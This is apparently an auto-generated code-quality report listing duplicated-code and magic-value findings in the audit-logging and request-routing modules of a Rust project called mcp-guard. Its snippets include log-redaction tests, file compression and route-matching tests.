- **File:** `src/audit/mod.rs`
- **Line:** 1031

**Code:**
```
    fn test_redaction_rules_bearer_token() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer_tokens".to_string(),
                pattern: r"Bearer\s+[A-Za-z0-9\-_.]+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xyz";
        let output = rules.redact(input);
        assert!(!output.contains("eyJ"));
        assert!(output.contains("Bearer [REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.5% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1171

**Code:**
```
    fn test_rotating_file_writer_creation() {
        let temp_dir = TempDir::new().expect("Should create temp dir");
        let log_path = temp_dir.path().join("test.log");

        let config = LogRotationConfig {
            enabled: true,
            max_size_bytes: Some(1024),
            max_age_secs: None,
            max_backups: 3,
            compress: false,
        };

        let writer = RotatingFileWriter::new(log_path.clone(), config);
        assert!(writer.is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.3% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 859

**Code:**
```
    fn new(
        url: String,
        headers: HashMap<String, String>,
        batch_size: usize,
        flush_interval_secs: u64,
    ) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(AUDIT_HTTP_TIMEOUT_SECS))
            .build()
            .unwrap_or_else(|e| {
                tracing::warn!(
                    error = %e,
                    "Failed to create HTTP client with custom config, using default"
                );
                reqwest::Client::new()
            });

        Self {
            url,
            headers,
            batch_size,
            flush_interval: Duration::from_secs(flush_interval_secs),
            client,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.2% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 276

**Code:**
```
    fn compress_file(source: &PathBuf, dest: &PathBuf) -> io::Result<()> {
        let input = File::open(source)?;
        let output = File::create(dest)?;
        let mut encoder = GzEncoder::new(output, Compression::default());

        io::copy(&mut io::BufReader::new(input), &mut encoder)?;
        encoder.finish()?;

        Ok(())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1047

**Code:**
```
    fn test_redaction_rules_api_key() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "api_keys".to_string(),
                pattern: r"(?i)(api[_-]?key)[=:]\s*([a-zA-Z0-9_\-]{20,})".to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Config: api_key=sk-1234567890abcdefghij1234567890";
        let output = rules.redact(input);
        assert!(!output.contains("sk-1234567890"));
        assert!(output.contains("api_key=[REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.8% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1113

**Code:**
```
    fn test_redaction_preserves_non_sensitive_data() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "passwords".to_string(),
                pattern: r"password=\S+".to_string(),
                replacement: "password=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "user=john tool=read_file status=success";
        let output = rules.redact(input);
        assert_eq!(input, output); // No changes
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.7% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 276

**Code:**
```
    fn compress_file(source: &PathBuf, dest: &PathBuf) -> io::Result<()> {
        let input = File::open(source)?;
        let output = File::create(dest)?;
        let mut encoder = GzEncoder::new(output, Compression::default());

        io::copy(&mut io::BufReader::new(input), &mut encoder)?;
        encoder.finish()?;

        Ok(())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.5% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1171

**Code:**
```
    fn test_rotating_file_writer_creation() {
        let temp_dir = TempDir::new().expect("Should create temp dir");
        let log_path = temp_dir.path().join("test.log");

        let config = LogRotationConfig {
            enabled: true,
            max_size_bytes: Some(1024),
            max_age_secs: None,
            max_backups: 3,
            compress: false,
        };

        let writer = RotatingFileWriter::new(log_path.clone(), config);
        assert!(writer.is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.4% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1113

**Code:**
```
    fn test_redaction_preserves_non_sensitive_data() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "passwords".to_string(),
                pattern: r"password=\S+".to_string(),
                replacement: "password=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "user=john tool=read_file status=success";
        let output = rules.redact(input);
        assert_eq!(input, output); // No changes
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.3% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1063

**Code:**
```
    fn test_redaction_rules_password() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "passwords".to_string(),
                pattern: r#"(?i)(password|passwd|secret)["\s:=]+["\']?([^"\'`,\s}{]+)"#.to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = r#"{"password": "super_secret_123"}"#;
        let output = rules.redact(input);
        assert!(!output.contains("super_secret_123"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.2% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1101

**Code:**
```
    fn test_redaction_rules_invalid_regex() {
        let result = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "invalid".to_string(),
                pattern: "[invalid(regex".to_string(), // Invalid regex
                replacement: "[REDACTED]".to_string(),
            },
        ]);
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.2% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1101

**Code:**
```
    fn test_redaction_rules_invalid_regex() {
        let result = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "invalid".to_string(),
                pattern: "[invalid(regex".to_string(), // Invalid regex
                replacement: "[REDACTED]".to_string(),
            },
        ]);
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1031

**Code:**
```
    fn test_redaction_rules_bearer_token() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer_tokens".to_string(),
                pattern: r"Bearer\s+[A-Za-z0-9\-_.]+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xyz";
        let output = rules.redact(input);
        assert!(!output.contains("eyJ"));
        assert!(output.contains("Bearer [REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.8% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1328

**Code:**
```
    fn test_audit_entry_serialization() {
        let entry = AuditEntry::new(EventType::AuthFailure)
            .with_identity("user1")
            .with_success(false)
            .with_message("Invalid credentials");

        let json = serde_json::to_string(&entry).expect("Should serialize");
        assert!(json.contains("auth_failure"));
        assert!(json.contains("user1"));
        assert!(json.contains("Invalid credentials"));
        assert!(json.contains("\"success\":false"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.7% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 66

**Code:**
```
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("CompiledRedactionRules")
            .field("rules_count", &self.rules.len())
            .field("rule_names", &self.rules.iter().map(|(name, _, _)| name.as_str()).collect::<Vec<_>>())
            .finish()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.7% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 859

**Code:**
```
    fn new(
        url: String,
        headers: HashMap<String, String>,
        batch_size: usize,
        flush_interval_secs: u64,
    ) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(AUDIT_HTTP_TIMEOUT_SECS))
            .build()
            .unwrap_or_else(|e| {
                tracing::warn!(
                    error = %e,
                    "Failed to create HTTP client with custom config, using default"
                );
                reqwest::Client::new()
            });

        Self {
            url,
            headers,
            batch_size,
            flush_interval: Duration::from_secs(flush_interval_secs),
            client,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.5% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 859

**Code:**
```
    fn new(
        url: String,
        headers: HashMap<String, String>,
        batch_size: usize,
        flush_interval_secs: u64,
    ) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(AUDIT_HTTP_TIMEOUT_SECS))
            .build()
            .unwrap_or_else(|e| {
                tracing::warn!(
                    error = %e,
                    "Failed to create HTTP client with custom config, using default"
                );
                reqwest::Client::new()
            });

        Self {
            url,
            headers,
            batch_size,
            flush_interval: Duration::from_secs(flush_interval_secs),
            client,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.5% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1031

**Code:**
```
    fn test_redaction_rules_bearer_token() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer_tokens".to_string(),
                pattern: r"Bearer\s+[A-Za-z0-9\-_.]+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xyz";
        let output = rules.redact(input);
        assert!(!output.contains("eyJ"));
        assert!(output.contains("Bearer [REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.3% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1101

**Code:**
```
    fn test_redaction_rules_invalid_regex() {
        let result = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "invalid".to_string(),
                pattern: "[invalid(regex".to_string(), // Invalid regex
                replacement: "[REDACTED]".to_string(),
            },
        ]);
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.3% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1031

**Code:**
```
    fn test_redaction_rules_bearer_token() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer_tokens".to_string(),
                pattern: r"Bearer\s+[A-Za-z0-9\-_.]+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xyz";
        let output = rules.redact(input);
        assert!(!output.contains("eyJ"));
        assert!(output.contains("Bearer [REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1308

**Code:**
```
    fn test_audit_entry_all_fields() {
        let entry = AuditEntry::new(EventType::ToolCall)
            .with_identity("user1")
            .with_method("tools/call")
            .with_tool("read_file")
            .with_success(true)
            .with_message("File read successfully")
            .with_duration(150)
            .with_request_id("req-123");

        assert_eq!(entry.identity_id, Some("user1".to_string()));
        assert_eq!(entry.method, Some("tools/call".to_string()));
        assert_eq!(entry.tool, Some("read_file".to_string()));
        assert!(entry.success);
        assert_eq!(entry.message, Some("File read successfully".to_string()));
        assert_eq!(entry.duration_ms, Some(150));
        assert_eq!(entry.request_id, Some("req-123".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1113

**Code:**
```
    fn test_redaction_preserves_non_sensitive_data() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "passwords".to_string(),
                pattern: r"password=\S+".to_string(),
                replacement: "password=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "user=john tool=read_file status=success";
        let output = rules.redact(input);
        assert_eq!(input, output); // No changes
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.9% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 276

**Code:**
```
    fn compress_file(source: &PathBuf, dest: &PathBuf) -> io::Result<()> {
        let input = File::open(source)?;
        let output = File::create(dest)?;
        let mut encoder = GzEncoder::new(output, Compression::default());

        io::copy(&mut io::BufReader::new(input), &mut encoder)?;
        encoder.finish()?;

        Ok(())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.9% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 859

**Code:**
```
    fn new(
        url: String,
        headers: HashMap<String, String>,
        batch_size: usize,
        flush_interval_secs: u64,
    ) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(AUDIT_HTTP_TIMEOUT_SECS))
            .build()
            .unwrap_or_else(|e| {
                tracing::warn!(
                    error = %e,
                    "Failed to create HTTP client with custom config, using default"
                );
                reqwest::Client::new()
            });

        Self {
            url,
            headers,
            batch_size,
            flush_interval: Duration::from_secs(flush_interval_secs),
            client,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.7% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 276

**Code:**
```
    fn compress_file(source: &PathBuf, dest: &PathBuf) -> io::Result<()> {
        let input = File::open(source)?;
        let output = File::create(dest)?;
        let mut encoder = GzEncoder::new(output, Compression::default());

        io::copy(&mut io::BufReader::new(input), &mut encoder)?;
        encoder.finish()?;

        Ok(())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.6% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1063

**Code:**
```
    fn test_redaction_rules_password() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "passwords".to_string(),
                pattern: r#"(?i)(password|passwd|secret)["\s:=]+["\']?([^"\'`,\s}{]+)"#.to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = r#"{"password": "super_secret_123"}"#;
        let output = rules.redact(input);
        assert!(!output.contains("super_secret_123"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.5% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1113

**Code:**
```
    fn test_redaction_preserves_non_sensitive_data() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "passwords".to_string(),
                pattern: r"password=\S+".to_string(),
                replacement: "password=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "user=john tool=read_file status=success";
        let output = rules.redact(input);
        assert_eq!(input, output); // No changes
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.5% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1047

**Code:**
```
    fn test_redaction_rules_api_key() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "api_keys".to_string(),
                pattern: r"(?i)(api[_-]?key)[=:]\s*([a-zA-Z0-9_\-]{20,})".to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Config: api_key=sk-1234567890abcdefghij1234567890";
        let output = rules.redact(input);
        assert!(!output.contains("sk-1234567890"));
        assert!(output.contains("api_key=[REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.5% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 276

**Code:**
```
    fn compress_file(source: &PathBuf, dest: &PathBuf) -> io::Result<()> {
        let input = File::open(source)?;
        let output = File::create(dest)?;
        let mut encoder = GzEncoder::new(output, Compression::default());

        io::copy(&mut io::BufReader::new(input), &mut encoder)?;
        encoder.finish()?;

        Ok(())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.3% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 769

**Code:**
```
    fn write_line(&mut self, line: &str) -> io::Result<()> {
        match self {
            FileWriter::Simple(f) => {
                writeln!(f, "{}", line)
            }
            FileWriter::Rotating(r) => {
                r.write_line(line)
            }
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.1% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 276

**Code:**
```
    fn compress_file(source: &PathBuf, dest: &PathBuf) -> io::Result<()> {
        let input = File::open(source)?;
        let output = File::create(dest)?;
        let mut encoder = GzEncoder::new(output, Compression::default());

        io::copy(&mut io::BufReader::new(input), &mut encoder)?;
        encoder.finish()?;

        Ok(())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 859

**Code:**
```
    fn new(
        url: String,
        headers: HashMap<String, String>,
        batch_size: usize,
        flush_interval_secs: u64,
    ) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(AUDIT_HTTP_TIMEOUT_SECS))
            .build()
            .unwrap_or_else(|e| {
                tracing::warn!(
                    error = %e,
                    "Failed to create HTTP client with custom config, using default"
                );
                reqwest::Client::new()
            });

        Self {
            url,
            headers,
            batch_size,
            flush_interval: Duration::from_secs(flush_interval_secs),
            client,
        }
    }
```

---

#### Magic value '"CompiledRedactionRules"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 67

---

#### Magic value '"rules_count"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 68

---

#### Magic value '"rule_names"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 69

---

#### Magic value 'b"\n"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 184

---

#### Magic value ''↵'' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 374

---

#### Magic value ''\0'' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 377

---

#### Magic value '"mcp-guard-audit.log"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 756

---

#### Magic value '"application/json"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 969

---

#### Magic value '"test.log"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1173

---

#### Magic value '"test.log"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1190

---

#### Magic value '"test.log"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1221

---

#### Magic value '"audit.log"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1253

---

#### Magic value '"user123"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1299

---

#### Magic value '"user1"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1310

---

#### Magic value '"tools/call"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1311

---

#### Magic value '"read_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1312

---

#### Magic value '150' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/audit/mod.rs`
- **Line:** 1315

---

#### Magic value '"user1"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1330

---

#### Magic value '"user1"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1367

---

#### Magic value '"user1"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1369

---

#### Magic value '"read_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1369

---

#### Magic value '"user1"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1370

---

#### Magic value '"user1"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1371

---

#### Magic value '"write_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1371

---

#### Magic value '"user1"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1378

---

#### Magic value '"user1"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1388

---

#### Magic value '"user1"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1425

---

#### Magic value '"user1"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1439

---

#### Magic value '"user1"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1440

---

#### Magic value '"read_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1440

---

#### Magic value '"file_test_user"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1460

---

#### Magic value '"file_test_user"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1461

---

#### Magic value '"write_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1461

---

#### Magic value '"user1"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1483

---

#### Magic value '30' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/audit/mod.rs`
- **Line:** 1500

---

#### Magic value '60' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/audit/mod.rs`
- **Line:** 1518

---

#### Magic value '"user1"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1534

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 269

**Code:**
```
    fn test_route_matcher_exact() {
        let routes = vec![
            create_test_route("github", "/github", false),
            create_test_route("filesystem", "/filesystem", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        assert_eq!(matcher.match_path("/github/repos"), Some("github"));
        assert_eq!(matcher.match_path("/filesystem/read"), Some("filesystem"));
        assert_eq!(matcher.match_path("/unknown/path"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 269

**Code:**
```
    fn test_route_matcher_exact() {
        let routes = vec![
            create_test_route("github", "/github", false),
            create_test_route("filesystem", "/filesystem", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        assert_eq!(matcher.match_path("/github/repos"), Some("github"));
        assert_eq!(matcher.match_path("/filesystem/read"), Some("filesystem"));
        assert_eq!(matcher.match_path("/unknown/path"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 269

**Code:**
```
    fn test_route_matcher_exact() {
        let routes = vec![
            create_test_route("github", "/github", false),
            create_test_route("filesystem", "/filesystem", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        assert_eq!(matcher.match_path("/github/repos"), Some("github"));
        assert_eq!(matcher.match_path("/filesystem/read"), Some("filesystem"));
        assert_eq!(matcher.match_path("/unknown/path"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 282

**Code:**
```
    fn test_route_matcher_longest_prefix() {
        let routes = vec![
            create_test_route("api", "/api", false),
            create_test_route("api-v2", "/api/v2", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        // Longer prefix should win
        assert_eq!(matcher.match_path("/api/v2/users"), Some("api-v2"));
        assert_eq!(matcher.match_path("/api/v1/users"), Some("api"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 282

**Code:**
```
    fn test_route_matcher_longest_prefix() {
        let routes = vec![
            create_test_route("api", "/api", false),
            create_test_route("api-v2", "/api/v2", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        // Longer prefix should win
        assert_eq!(matcher.match_path("/api/v2/users"), Some("api-v2"));
        assert_eq!(matcher.match_path("/api/v1/users"), Some("api"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 319

**Code:**
```
    fn test_route_matcher_root_path() {
        let routes = vec![
            create_test_route("root", "/", false),
            create_test_route("api", "/api", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        // More specific should win
        assert_eq!(matcher.match_path("/api/users"), Some("api"));
        // Root should match everything else
        assert_eq!(matcher.match_path("/other"), Some("root"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 352

**Code:**
```
    fn test_router_error_no_route() {
        let err = RouterError::NoRoute("/unknown".to_string());
        let msg = format!("{}", err);
        assert!(msg.contains("/unknown"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 395

**Code:**
```
    fn test_config_validation_http_missing_url() {
        let config = ServerRouteConfig {
            name: "http".to_string(),
            path_prefix: "/http".to_string(),
            transport: TransportType::Http,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 395

**Code:**
```
    fn test_config_validation_http_missing_url() {
        let config = ServerRouteConfig {
            name: "http".to_string(),
            path_prefix: "/http".to_string(),
            transport: TransportType::Http,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 409

**Code:**
```
    fn test_config_validation_sse_missing_url() {
        let config = ServerRouteConfig {
            name: "sse".to_string(),
            path_prefix: "/sse".to_string(),
            transport: TransportType::Sse,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 427

**Code:**
```
    fn test_router_new_validation() {
        // Test with invalid URL scheme to ensure validation runs
        let invalid_config = ServerRouteConfig {
            name: "invalid".to_string(),
            path_prefix: "/invalid".to_string(),
            transport: TransportType::Http,
            command: None,
            args: vec![],
            url: Some("not-a-url".to_string()),
            strip_prefix: false,
        };
        
        let result = tokio::runtime::Runtime::new().unwrap().block_on(ServerRouter::new(vec![invalid_config]));
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), RouterError::TransportInit(_, _)));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 427

**Code:**
```
    fn test_router_new_validation() {
        // Test with invalid URL scheme to ensure validation runs
        let invalid_config = ServerRouteConfig {
            name: "invalid".to_string(),
            path_prefix: "/invalid".to_string(),
            transport: TransportType::Http,
            command: None,
            args: vec![],
            url: Some("not-a-url".to_string()),
            strip_prefix: false,
        };
        
        let result = tokio::runtime::Runtime::new().unwrap().block_on(ServerRouter::new(vec![invalid_config]));
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), RouterError::TransportInit(_, _)));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 445

**Code:**
```
    fn test_router_send_no_route() {
        let router = ServerRouter {
            routes: vec![],
            default_route: None,
        };

        let test_message = Message::request(1, "ping", None);
        let result = tokio::runtime::Runtime::new().unwrap().block_on(
            router.send("/unknown", test_message)
        );
        assert!(matches!(result, Err(RouterError::NoRoute(_))));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 504

**Code:**
```
    fn test_router_route_count() {
        use crate::mocks::MockTransport;
        let router = ServerRouter {
            routes: vec![
                ServerRoute {
                    config: create_test_route("s1", "/s1", false),
                    transport: Arc::new(MockTransport::new()),
                },
                ServerRoute {
                    config: create_test_route("s2", "/s2", false),
                    transport: Arc::new(MockTransport::new()),
                }
            ],
            default_route: None,
        };
        
